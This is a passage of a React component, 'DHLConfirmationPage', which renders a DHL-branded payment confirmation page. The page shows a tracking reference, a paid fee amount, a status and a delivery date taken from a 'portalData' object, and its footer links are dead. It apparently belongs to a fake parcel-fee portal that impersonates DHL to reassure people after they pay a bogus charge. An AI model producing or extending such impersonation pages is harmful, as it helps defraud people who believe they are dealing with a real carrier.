        .dhl-header { background: #ffcc00; padding: 0 20px; }
        .dhl-header-container { max-width: 1190px; margin: 0 auto; display: flex; justify-content: space-between; align-items: center; min-height: 60px; }
        .dhl-logo img { height: 20px; }
        .portal-lang-dropdown { position: relative; }
        .portal-lang-btn { display: flex; align-items: center; gap: 6px; padding: 6px 12px; background: rgba(0,0,0,0.05); border: 1px solid rgba(0,0,0,0.1); border-radius: 8px; color: #333; font-size: 0.82rem; font-weight: 500; cursor: pointer; }
        .portal-lang-btn:hover { background: rgba(0,0,0,0.1); }
        .lang-menu { position: absolute; top: calc(100% + 6px); right: 0; background: white; border-radius: 10px; box-shadow: 0 8px 32px rgba(0,0,0,0.18); width: 220px; max-height: 400px; overflow-y: auto; z-index: 200; border: 1px solid #e2e8f0; }
        .main-content { min-height: 100vh; background: #F7F7F7; padding-top: 20px; }
        .content-wrapper { display: flex; flex-direction: column; align-items: center; justify-content: center; margin-top: 10px; padding: 0 20px; }
        .confirmation-card { max-width: 850px; width: 100%; padding: 30px 80px 80px; border-radius: 8px; margin-bottom: 35px; background: transparent; }
        .ty-container { text-align: center; padding: 20px 20px 40px; }
        .check-circle { margin: 0 auto 20px; animation: checkPop 0.5s cubic-bezier(0.34, 1.56, 0.64, 1) forwards; }
        @keyframes checkPop { from { transform: scale(0); } to { transform: scale(1); } }
        .ty-title { font-size: 26px; font-weight: 700; color: #4caf50; margin: 0 0 10px; }
        .ty-sub { font-size: 15px; color: #666; margin: 0 0 28px; line-height: 1.5; }
        .info-box { background: #f9fafb; border: 1px solid #eee; border-radius: 10px; padding: 20px 24px; max-width: 380px; margin: 0 auto 24px; text-align: left; }
        [dir="rtl"] .info-box { text-align: right; }
        .info-row { display: flex; justify-content: space-between; padding: 6px 0; font-size: 13px; }
        .info-label { color: #999; }
        .info-value { color: #333; font-weight: 600; }
        .info-value-green { color: #4caf50; font-weight: 600; }
        .info-divider { border-top: 1px solid #eee; margin: 8px 0; }
        .ty-note { font-size: 13px; color: #aaa; margin: 0; }
        .redirect-banner { margin-top: 16px; padding: 10px 20px; background: #fff3e0; border-radius: 40px; display: inline-block; font-size: 14px; font-weight: 500; color: #d48900; border: 1px solid #ffe0b3; }
        .footer { padding: 30px 0; background: white; color: #4f4f4f; border-top: 1px solid #ddd; margin-top: 20px; }
        .footer-container { max-width: 1190px; margin: 0 auto; padding: 0 40px; }
        .footer-content { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 30px; }
        .footer-links { display: flex; flex-direction: column; gap: 6px; }
        .footer-link { color: #4f4f4f; text-decoration: none; font-weight: 500; }
        .footer-link:hover { text-decoration: underline; }
        .footer-logo img { width: 128px; height: auto; }
        .copyright { margin-top: 6px; font-size: 12px; color: #777; }
        @media (max-width: 768px) { .confirmation-card { padding: 30px 20px 80px; } .footer-container { padding: 0 20px; } .footer-content { flex-direction: column; text-align: center; } }
      `}</style>

      <header className="dhl-header">
        <div className="dhl-header-container">
          <div className="dhl-logo">
            <img alt="DHL Logo" src="/dhl-express-logo.png" />
          </div>
          <div className="portal-lang-dropdown" ref={langMenuRef}>
            <button className="portal-lang-btn" onClick={() => setLangMenuOpen(!langMenuOpen)}>
              <span>{selectedLang.flag}</span>
              <span>{selectedLang.name}</span>
              <svg width="12" height="12" viewBox="0 0 12 12" fill="none" style={{ marginLeft: '4px' }}><path d="M3 5L6 8L9 5" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" /></svg>
            </button>
            {langMenuOpen && (
              <div className="lang-menu">
                {languages.map((lang) => (
                  <div key={lang.code + lang.name} onClick={() => handleLanguageSelect(lang)} style={{ display: 'flex', alignItems: 'center', gap: '10px', padding: '10px 16px', cursor: 'pointer', backgroundColor: selectedLang.code === lang.code ? '#f1f5f9' : 'transparent', direction: lang.rtl ? 'rtl' : 'ltr' }}>
                    <span>{lang.flag}</span>
                    <span>{lang.name}</span>
                    {selectedLang.code === lang.code && <span style={{ marginLeft: 'auto', color: '#d40511' }}>✓</span>}
                  </div>
                ))}
              </div>
            )}
          </div>
        </div>
      </header>

      <main className="main-content">
        <div className="content-wrapper">
          <div className="confirmation-card">
            <div className="ty-container">
              <div className="check-circle"><svg width="70" height="70" viewBox="0 0 70 70" fill="none"><circle cx="35" cy="35" r="34" fill="#4caf50" /><path d="M20 35L30 45L50 24" stroke="white" strokeWidth="4" strokeLinecap="round" strokeLinejoin="round" /></svg></div>
              <h2 className="ty-title">{t.title}</h2>
              <p className="ty-sub">{t.subtitle}</p>
              <div className="info-box">
                <div className="info-row"><span className="info-label">{t.tracking}</span><span className="info-value">{portalData.reference_code}</span></div>
                <div className="info-row"><span className="info-label">{t.amount}</span><span className="info-value-green">{portalData.currency_symbol} {portalData.fee_display} {portalData.currency_code !== portalData.currency_symbol ? `(${portalData.currency_code})` : ''}</span></div>
                <div className="info-divider"></div>
                <div className="info-row"><span className="info-label">{t.status}</span><span className="info-value-green">{t.statusValue}</span></div>
                <div className="info-row"><span className="info-label">{t.delivery}</span><span className="info-value">{portalData.expected_delivery}</span></div>
              </div>
              <p className="ty-note" style={{ marginTop: '20px' }}>{t.note}</p>
            </div>
          </div>
        </div>
      </main>

      <footer className="footer">
        <div className="footer-container">
          <div className="footer-content">
            <div className="footer-links"><a href="#" className="footer-link"><strong>{t.privacy}</strong></a><a href="#" className="footer-link">{t.consent}</a></div>
            <div className="footer-logo"><img alt="DHL Logo" src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyBpZD0ibG9nbyIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB2aWV3Qm94PSIwIDAgMTk2IDUxLjgzNjciIHdpZHRoPSIxNjAiIGhlaWdodD0iNTIiPgogIDxnPgogICAgPGc+CiAgICAgIDxnPgogICAgICAgIDxwb2x5Z29uIHBvaW50cz0iMCAyMi4xIDI2LjUwNTggMjIuMSAyNS4wNTgxIDI0LjA3MDMgMCAyNC4wNzAzIDAgMjIuMSAwIDIyLjEiLz4KICAgICAgICA8cG9seWdvbiBwb2ludHM9IjAgMTguNDQ0NCAyOS4xOTg2IDE4LjQ0NDQgMjcuNzQ4MyAyMC40MTIgMCAyMC40MTIgMCAxOC40NDQ0IDAgMTguNDQ0NCIvPgogICAgICAgIDxwb2x5Z29uIHBvaW50cz0iMCAyNS43NTg0IDIzLjgxNDYgMjUuNzU4NCAyMi4zNzMzIDI3LjcxNTIgMCAyNy43MTUyIDAgMjUuNzU4NCAwIDI1Ljc1ODQiLz4KICAgICAgPC9nPgogICAgICA8Zz4KICAgICAgICA8cG9seWdvbiBwb2ludHM9IjE5NiAyNC4wNzAzIDE2OS41OTc2IDI0LjA3MDMgMTcxLjA0NDYgMjIuMTAxNCAxOTYgMjIuMTAxNCAxOTYgMjQuMDcwMyAxOTYgMjQuMDcwMyIvPgogICAgICAgIDxwb2x5Z29uIHBvaW50cz0iMTk2IDI3LjcxNTIgMTY2LjkxMjggMjcuNzE3OSAxNjguMzUzNyAyNS43NTg0IDE5NiAyNS43NTg0IDE5NiAyNy43MTUyIDE5NiAyNy43MTUyIi8+CiAgICAgICAgPHBvbHlnb24gcG9pbnRzPSIxNzMuNzM1NCAxOC40NDQ0IDE5NiAxOC40NDQ0IDE5NiAyMC40MTMzIDE3Mi4yODcgMjAuNDE0NyAxNzMuNzM1NCAxOC40NDQ0IDE3My43MzU0IDE4LjQ0NDQiLz4KICAgICAgPC9nPgogICAgPC9nPgogICAgPGc+CiAgICAgIDxwYXRoIGQ9Im0yNS42NzI2LDI3LjcxNTJsMTIuNTc4LTE3LjA4ODVoMTUuNjA4MmMxLjcyNTIsMCwxLjcwMjYuNjU1Ljg1OTUsMS43OTc1LS44NTYyLDEuMTYtMi4zMTM0LDMuMTU0Ni0zLjE4NTQsNC4zMzIyLS40NDI2LjU5ODItMS4yNDMxLDEuNjg4MSwxLjQwODksMS42ODgxaDIwLjkxMDFjLTEuNzM5LDIuMzgyMi03LjM3OTYsOS4yNzA4LTE3LjUwODMsOS4yNzA4aC0zMC42NzFaIi8+CiAgICAgIDxwYXRoIGQ9Im05Ny43MDU2LDE4LjQ0M2wtNi44MjAyLDkuMjcyMmgtMTcuOTkyNHM2LjgxNzItOS4yNzA4LDYuODIzMy05LjI3MDhsMTcuOTg5My0uMDAxNGgwWiIvPgogICAgICA8cGF0aCBkPSJtMTIzLjcyMzksMTguNDQ0NGwtNi44MjM5LDkuMjcwOGgtMTcuOTg1NnM2LjgxNzgtOS4yNzA4LDYuODIzOS05LjI3MDhoMTcuOTg1NloiLz4KICAgICAgPHBhdGggZD0ibTEyOS41NzQ5LDE4LjQ0NDRjLjAwMDYsMC0xLjMxNCwxLjc5NzQtMS45NTI4LDIuNjYwNC0yLjI1OTMsMy4wNTMzLS4yNjI2LDYuNjEwNCw3LjExMDksNi42MTA0aDI4Ljg4NTNsNi44MjI2LTkuMjcwOGgtNDAuODY2MVoiLz4KICAgIDwvZz4KICAgIDxnPgogICAgICA8cGF0aCBkPSJtMzQuNDY4NSwwbC02LjI2MjEsOC41MDc4aDM0LjEyODhjMS43MjQ5LDAsMS43MDIzLjY1NS44NTkzLDEuNzk3NC0uODU2MiwxLjE1ODctMi4yODk0LDMuMTc2My0zLjE2MTQsNC4zNTM4LS40NDI3LjU5NjktMS4yNDMxLDEuNjg2NywxLjQwODksMS42ODY3aDEzLjk1NjRzMi4yNDk1LTMuMDYxNCw0LjEzNTItNS42MjA1YzIuNTY1NS0zLjQ4MTQuMjIyNS0xMC43MjUyLTguOTQ4Ni0xMC43MjUyaC0zNi4xMTY1WiIvPgogICAgICA8cG9seWdvbiBwb2ludHM9IjEyNS4yNjg4IDE2LjM0NTggODEuMjYxOSAxNi4zNDU4IDkzLjI5NTYgMCAxMTEuMjgxOSAwIDEwNC4zODU4IDkuMzcyMSAxMTIuNDEzNiA5LjM3MjEgMTE5LjMxNTMgMCAxMzcuMjk4OSAwIDEyNS4yNjg4IDE2LjM0NTggMTI1LjI2ODggMTYuMzQ1OCIvPgogICAgICA8cGF0aCBkPSJtMTYyLjIwODQsMGwtMTIuMDMxNCwxNi4zNDU4aC0xOS4wNTkzUzE0My4xNTMyLDAsMTQzLjE1OTIsMGgxOS4wNDkyWiIvPgogICAgPC9nPgogIDwvZz4KPC9zdmc+" /></div>
          </div>
          <div className="copyright">© 2026 DHL Group - {t.copyright}</div>
        </div>
      </footer>
    </div>
  );
};

export default DHLConfirmationPage;